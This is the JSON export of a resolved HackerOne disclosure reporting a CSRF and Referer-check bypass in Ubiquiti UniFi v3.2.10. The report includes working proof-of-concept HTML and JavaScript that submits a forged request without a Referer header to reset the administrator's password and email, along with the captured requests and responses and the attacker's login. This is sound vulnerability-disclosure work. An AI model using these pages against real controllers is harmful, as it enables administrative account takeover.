{
  "id": 52635,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjYzNQ==",
  "url": "https://hackerone.com/reports/52635",
  "title": "UniFi v3.2.10 Cross-Site Request Forgeries / Referer-Check Bypass",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-03-19T17:54:18.003Z",
  "submitted_at": "2015-03-19T17:54:18.003Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mrtuxracer",
    "url": "/mrtuxracer",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/712/1b557efb0f937952d001f3e4604cc0c78d54ddea_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 800,
    "url": "https://hackerone.com/ui",
    "handle": "ui",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ubiquiti Inc.",
      "twitter_handle": "ubiquiti",
      "website": "https://ui.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-01-07T20:31:59.317Z",
  "bug_reporter_agreed_on_going_public_at": "2015-12-08T20:31:47.360Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "VULNERABILITY DESCRIPTION\r\n-----------\r\nThe application UniFi v3.2.10 uses JSON requests to add/edit/save/delete configuration options on the administrative web-interface, but the application has an insufficient Cross-Site Request Forgery protection in place by  only checking whether the Referer Header is present and if its actual value matches the host where the system is running (default: 127.0.0.1).\r\n\r\nVERSIONS AFFECTED\r\n------------\r\nUniFi v3.2.10 \r\nolder versions may be affected too.\r\n\r\nPROOF-OF-CONCEPT (Steps to reproduce):\r\n---------------\r\nThe following Proof-of-Concept will bypass the CSRF protection and change the password of the administrator. Basically all functionalities are vulnerable on the same way.\r\n\r\nTherefore a typical request to change the password of the user \"admin\" to \"test\" looks like the following when issued using the web interface:\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 163\r\n    Accept: */*\r\n    Origin: https://127.0.0.1:8443\r\n    X-Requested-With: XMLHttpRequest\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) > Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n    Referer: https://127.0.0.1:8443/manage/s/default\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22test%22%2C%22email%22%3A%22admin%40admin.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\r\n\r\nThe following script (ubi_common_csrf.php) tries to exploit this vulnerability by changing the email address of the user \"admin\" to \"info@rcesecurity.com\" and the associated password to \"csrfpwd\":\r\n\r\n    <html>\r\n    <form action=\"https://127.0.0.1:8443/api/s/default/cmd/sitemgr\" method=\"post\" enctype=\"text/plain\">\r\n    <input name=\"json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%2$\r\n    <input type=submit>\r\n    </form>\r\n    </html>\r\n\r\nThis would lead to the following HTTP POST request with the HTTP Referer header set to e.g. http://www.rcesecurity.com, where the CSRF script is placed:\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 173\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: http://www.rcesecurity.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: text/plain\r\n    Referer: http://www.rcesecurity.com/pocs/common_csrf.php\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==\r\n\r\nIn this case the application correctly responds with an HTTP 401 error code denying the password change:\r\n\r\n    HTTP/1.1 401 Unauthorized\r\n    Server: Apache-Coyote/1.1\r\n    Content-Type: application/json;charset=ISO-8859-1\r\n    Content-Length: 78\r\n    Date: Thu, 19 Mar 2015 17:24:53 GMT\r\n\r\n    { \"data\" : [ ] , \"meta\" : { \"msg\" : \"api.err.LoginRequired\" , \"rc\" : \"error\"}}\r\n\r\nBut if the HTTP Referer-Header is stripped out from the HTTP Request:\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 173\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: http://www.rcesecurity.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: text/plain\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==\r\n\r\nThe application answers with an HTTP 200 code and the password was successfully changed:\r\n\r\n    HTTP/1.1 200 OK\r\n    Server: Apache-Coyote/1.1\r\n    Content-Type: application/json;charset=ISO-8859-1\r\n    Content-Length: 41\r\n    Date: Thu, 19 Mar 2015 17:28:21 GMT\r\n    \r\n    { \"data\" : [ ] , \"meta\" : { \"rc\" : \"ok\"}}\r\n\r\nSo all an attacker has to to is to strip out the HTTP Referer Header in a CSRF attack scenario like using the following script (ubi_passwd_change.php):\r\n\r\n    <html>\r\n    <head>\r\n    <script>\r\n    function load() {\r\n        var postdata = '<form id=csrf method=POST enctype=\\'text\\/plain\\' action=\\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\\'>' +\r\n                        '<input type=hidden name=\\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\\' value=\\'\\' />' +\r\n                        '</form>';\r\n        top.frames[0].document.body.innerHTML=postdata;\r\n        top.frames[0].document.getElementById('csrf').submit();\r\n    }\r\n    </script>\r\n    </head>\r\n    <body onload=\"load()\">\r\n    <iframe src=\"about:blank\" id=\"noreferer\">< /iframe>\r\n\r\nThe HTTP POST request issued by the script looks like the following (notice that the Referer Header is missing):\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 172\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: http://www.rcesecurity.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: text/plain\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D=\r\n\r\nAnd the application responds with an HTTP 200 code again:\r\n\r\n    HTTP/1.1 200 OK\r\n    Server: Apache-Coyote/1.1\r\n    Content-Type: application/json;charset=ISO-8859-1\r\n    Content-Length: 41\r\n    Date: Thu, 19 Mar 2015 17:31:25 GMT\r\n    \r\n    { \"data\" : [ ] , \"meta\" : { \"rc\" : \"ok\"}}\r\n\r\nThe attacker is now able to login to the UniFi interface using the following request:\r\n\r\n    POST https://127.0.0.1:8443/login HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 43\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: https://127.0.0.1:8443\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Referer: https://127.0.0.1:8443/login\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Host: 127.0.0.1:8443\r\n    \r\n    username=admin&password=csrfpwd&login=Login\r\n\r\nWhereas the application responds with an HTTP 302 code:\r\n\r\n    HTTP/1.1 302 Found\r\n    Server: Apache-Coyote/1.1\r\n    Set-Cookie: unifises=69f8ad84135bd1a2715e1530d4e07698; Path=/; Secure; HttpOnly\r\n    Location: https://127.0.0.1:8443/manage/s/default\r\n    Content-Type: text/html;charset=UTF-8\r\n    Content-Length: 0\r\n    Date: Thu, 19 Mar 2015 17:39:29 GMT\r\n\r\nAttached you'll find the following files to help investigate the issue:\r\npoc-0.png - Screenshot of changed user \"admin\"\r\n\r\nThe used CSRF scripts are live on my domain www.rcesecurity.com during your investigations:\r\nhttp://www.rcesecurity.com/pocs/ubi_common_csrf.php\r\nhttp://www.rcesecurity.com/pocs/ubi_passwd_change.php\r\n\r\nIf you need any further assistance or PoCs please just let me know.",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-01-07T20:31:47.535Z",
  "allow_singular_disclosure_after": -255625573.80438873,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "spam404",
    "vraj",
    "shivammusic",
    "akshay__brijpuria",
    "dyabla",
    "sbavis20"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
